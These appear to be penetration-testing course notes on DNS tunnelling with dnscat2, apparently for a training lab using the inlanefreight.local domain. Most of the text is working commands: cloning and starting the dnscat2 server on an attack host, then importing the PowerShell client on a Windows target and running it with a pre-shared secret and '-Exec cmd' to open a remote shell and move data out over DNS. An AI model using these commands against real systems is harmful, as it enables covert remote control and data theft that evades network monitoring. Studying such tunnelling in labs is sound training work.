
Uses DNS to send data between two hosts
- Data exfiltration over DNS
- Encrypted

- Set up dnscat2 server on attack host
- Set up dnscat2 client on target

```shell-session
git clone https://github.com/iagox86/dnscat2.git
```
```shell-session
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

**Starting dnscat2 server (attack host)
```shell-session
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
- Gives us secret key to use when starting client to encrypt traffic

**Cloning dnscat2-powershell (attack host)
```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
- Then, transfer to target

**Importing dnscat2.ps1 (on target)
```powershell-session
Import-Module .\dnscat2.ps1
```

**Run on target Windows machine
```powershell-session
Start-Dnscat2 -DNSserver 10.10.15.207 -Domain inlanefreight.local -PreSharedSecret f221676285634788816fc72cd644d4f5 -Exec cmd 
```

- 'window -i 1' creates a shell
- '?' gives us the help menu


